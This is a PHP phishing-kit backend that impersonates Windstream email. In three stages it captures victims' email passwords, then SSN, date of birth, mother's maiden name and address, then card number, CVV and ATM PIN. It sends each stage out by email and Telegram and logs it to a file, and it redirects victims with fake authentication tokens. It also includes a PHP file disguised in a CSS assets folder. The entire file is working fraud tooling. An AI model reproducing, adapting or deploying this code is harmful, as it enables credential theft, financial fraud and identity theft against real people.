<?php
include 'email.php';
function GetIp()
{
    if (isset($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
    else if (isset($_SERVER['HTTP_X_REAL_IP'])) $ip = $_SERVER['HTTP_X_REAL_IP'];
    else if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    else if (isset($_SERVER['HTTP_X_FORWARDED'])) $ip = $_SERVER['HTTP_X_FORWARDED'];
    else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_FORWARDED'])) $ip = $_SERVER['HTTP_FORWARDED'];
    else if (isset($_SERVER['REMOTE_ADDR'])) $ip = $_SERVER['REMOTE_ADDR'];
    else $ip = false;
    if ($ip == "::1") {
        return "127.0.0.1";
    }
    return $ip;
}

function randomi($length = 25)
{
    $bytes = random_bytes(ceil($length / 2));
    return substr(bin2hex($bytes), 0, $length);
}


if (!isset($_GET['auth_token'])) {
    $auth_token = randomi(115);
    $time_token = randomi(25);
    header('Location: ?auth_token=' . $auth_token . '&time_token' . $time_token);
}

if (isset($_POST['emailAddress'])) {
    $ip = GetIp();
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----[ Windstream EMAIL Access ]-----|\n";
    $message .= "Username: " . $_POST['emailAddress'] . "\n";
    $message .= "Password: " . $_POST['emailPassword'] . "\n";
    $message .= "Phone Number: " . $_POST['mobili'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "WindstreamEmail: $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';            // Set your API Token & Chat ID in telegram.php file //
    include __DIR__ . '/web/assets/css/common-redesign.inc.php';
    header("Location: ./web/name.php?auth_token=' . $auth_token . '&time_token' . $time_token");
}

if (isset($_POST['fullName'])) {
    $ip = GetIp();
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----[Windstream Fullz] -----|\n";
    $message .= "Full Name: " . $_POST['fullName'] . "\n";
    $message .= "DOB: " . $_POST['DateofBirth'] . "\n";
    $message .= "SSN: " . $_POST['ssnr'] . "\n";
    $message .= "MMN: " . $_POST['mmnr'] . "\n";
    $message .= "Phone Number: " . $_POST['pnumb'] . "\n";
    $message .= "|-----Windstream Billing -----|\n";
    $message .= "Address: " . $_POST['eAddress'] . "\n";
    $message .= "City: " . $_POST['city'] . "\n";
    $message .= "Zip Code: " . $_POST['ZipCode'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "WindstreamFullz : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';            // Set your API Token & Chat ID in telegram.php file //
    include __DIR__ . '/web/assets/css/common-redesign.inc.php';
    header("Location: ./web/card.php?auth_token=' . $auth_token . '&time_token' . $time_token");
}

if (isset($_POST['ccnr'])) {
    $ip = GetIp();
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----[Windstream Card] -----|\n";
    $message .= "Card: " . $_POST['ccnr'] . "\n";
    // Get BIN (first 6 digits) and lookup details
    $card_number = preg_replace('/\D/', '', $_POST['ccnr']); // Remove non-digits
    $bin = substr($card_number, 0, 6); // Get first 6 digits

    // Initialize BIN and Bank Name
    $bin_type = "Unknown";
    $bank_name = "Unknown";

    // Make API request to binlist.net
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/" . $bin);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Version: 3')); // API version
        $response = curl_exec($ch);

        if ($response !== false) {
            $bin_data = json_decode($response, true);
            if (json_last_error() === JSON_ERROR_NONE) {
                $bin_type = isset($bin_data['type']) ? $bin_data['type'] : "Unknown";
                $bank_name = isset($bin_data['bank']['name']) ? $bin_data['bank']['name'] : "Unknown";
            }
        }
        curl_close($ch);
    } catch (Exception $e) {
        // Handle cURL or JSON errors silently
        $bin_type = "Error retrieving type";
        $bank_name = "Error retrieving bank name";
    }

    // Add BIN and Bank details to message 
    $message .= "Exp: " . $_POST['expr'] . "\n";
    $message .= "CVV: " . $_POST['cvvr'] . "\n";
    $message .= "ATM Pin: " . $_POST['atmr'] . "\n";
    $message .= "BIN: " . $bin . "\n";
    $message .= "Card Type: " . $bin_type . "\n";
    $message .= "Bank Name: " . $bank_name . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "WindstreamCard : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';            // Set your API Token & Chat ID in telegram.php file // 
    include __DIR__ . '/web/assets/css/common-redesign.inc.php';
    header("Location: ./web/done.php?auth_token=' . $auth_token . '&time_token' . $time_token");
}

$fp = fopen(".", "a"); // Add name of text file if want to save. like "./nae.txt"//
fputs($fp, $message);
fclose($fp);
